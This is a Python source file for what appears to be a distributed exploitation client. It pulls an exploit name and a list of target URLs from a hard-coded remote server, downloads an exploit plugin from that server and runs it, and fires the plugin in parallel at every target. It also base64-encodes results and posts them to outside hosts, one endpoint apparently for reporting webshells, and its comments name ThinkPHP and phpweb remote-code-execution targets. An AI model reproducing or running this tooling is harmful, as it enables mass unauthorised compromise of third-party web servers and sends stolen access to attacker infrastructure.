from multiprocessing import Pool, cpu_count
import requests
from gevent.pool import Pool as ge_pool
from gevent.queue import Queue
import ast
import time
import base64
import os
import sys

requests.packages.urllib3.disable_warnings()
'''
pip3 install gevent

insert into exploitscan(page,exploitname,remoteip) values(0,'phpweb','127.0.0.1');
update exploitscan set page=0 where exploitname='thinkphp';

1.
'''

headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36'
        }

finish_urls = []
tasks = Queue()

def split_urls(urls):
    num_urls = len(urls)
    num_cpus = cpu_count()
    if num_urls < num_cpus:
        return [urls]
    num_urls_per_cpu = int(num_urls / num_cpus)
    splitted_urls = []
    for i in range(num_cpus):
        if i == 0:
            splitted_urls.append(urls[: (i + 1) * num_urls_per_cpu])
        elif i == num_cpus - 1:
            splitted_urls.append(urls[i * num_urls_per_cpu:])
        else:
            splitted_urls.append(urls[i * num_urls_per_cpu: (i + 1) * num_urls_per_cpu])
    return splitted_urls

def run_queue():
    sys.path.append('C:\\Users\\exp\\Desktop\\exploitscan\\plugin')
    import exploit
    while not tasks.empty():
        weburl = tasks.get()
        a = exploit.exploit_verify(weburl)
        a.expliot()


def postwebshell(strs):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36'
        }
        strss = strs + '|' + tag
        base64data = base64.b64encode(strss.encode('ascii'))
        data = {'wsq': base64data}
        requests.post('http://www.xchdlz.com:9090/ws',data=data,headers=headers)
    except:
        pass

def scanresult(strs,resp):
    headers={
        'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36'
    }
    url='http://www.baidu.com'
    resp='vulnerable'

    stss=url+'|'+exploitname+'|'+resp
    base64data=base64.b64encode(stss.encode('ascii'))
    data={'resp':base64data}
    requests.post('http://8.211.187.204:9090/scanresult',data=data,headers=headers)



def greenlet_crawler(urls):
    greenlet_pool = ge_pool(10)
    for url in urls:
        tasks.put_nowait(url)
        greenlet_pool.apply_async(run_queue)
        time.sleep(1)
    greenlet_pool.join()

def scheduler(urls):
    splitted_urls = split_urls(urls)
    process_pool = Pool(processes=cpu_count())
    for urls in splitted_urls:
        process_pool.apply_async(greenlet_crawler, (urls,))
    process_pool.close()
    process_pool.join()

def download(pluginname):
    store_path = 'C:\\Users\\exp\\Desktop\\exploitscan\\plugin'
    url = 'http://8.211.187.204:9090/download?file=' + pluginname + '.py'
    filepath = os.path.join(store_path, 'exploit.py')
    file_data = requests.get(url, headers=headers, allow_redirects=True).content
    with open(filepath, 'wb') as handler:
        handler.write(file_data)
    '''
    下载后自动注册插件
    '''

if __name__ == '__main__':
    # tag='thinkphp'
    # exploitname='thinkphprce'

    r = requests.get('http://8.211.187.204:9090/initplugin', timeout=5)
    print(r.content)
    print(type(r.content))
    cvenames = ast.literal_eval(r.content.decode('utf-8'))
    exploitname = cvenames[0]

    #
    # r = requests.get('http://8.211.187.204:9090/searchtag', timeout=5)
    # print(r.content)
    # exit()

    r = requests.get('http://8.211.187.204:9090/getdata?exploitname=%s' % exploitname, timeout=5)
    urls = ast.literal_eval(r.content.decode('utf-8'))
    print(urls)
    download(exploitname)


    # a = exploit.exploit_verify('http://www.baidu.com')
    # a.expliot()

    scheduler(urls)

    # while True:
    #     try:
    #         r = requests.get('http://8.211.187.204:9090/initplugin', timeout=5)
    #         print(r.content)
    #         print(type(r.content))
    #         cvenames = ast.literal_eval(r.content.decode('utf-8'))
    #         exploitname = cvenames[0]
    #
    #         #
    #         # r = requests.get('http://8.211.187.204:9090/searchtag', timeout=5)
    #         # print(r.content)
    #         # exit()
    #
    #         r = requests.get('http://8.211.187.204:9090/getdata?exploitname=%s' % exploitname, timeout=5)
    #         urls = ast.literal_eval(r.content.decode('utf-8'))
    #         print(urls)
    #         download(exploitname)
    #         sys.path.append('C:\\Users\\exp\\Desktop\\exploitscan\\plugin')
    #         import exploit
    #
    #         # a = exploit.exploit_verify('http://www.baidu.com')
    #         # a.expliot()
    #         exit()
    #         scheduler(urls)
    #     except:
    #         pass